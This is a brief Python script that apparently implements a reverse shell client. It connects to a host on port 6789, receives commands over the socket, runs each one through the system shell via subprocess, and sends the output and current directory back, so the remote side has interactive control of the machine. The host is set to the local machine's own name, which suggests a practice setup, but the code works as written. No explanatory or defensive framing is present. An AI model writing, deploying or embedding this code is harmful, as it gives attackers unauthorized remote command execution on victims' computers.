import os
import socket
import subprocess


# Create a socket
def create_connection():
    try:
        global host
        global port
        global s
        host = socket.getfqdn()
        port = 6789
        s = socket.socket()
        s.connect((host, port))
    except socket.error as msg:
        print("Connection fail")


# Receive commands from remote server and run on local machine
def get_commands():
    global s
    while True:
        data = s.recv(1024*8)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = output_bytes.decode("utf-8")
            s.send(str.encode(output_str + str('\n' + os.getcwd()) + '> '))
            print(output_str)
    s.close()


create_connection()
get_commands()
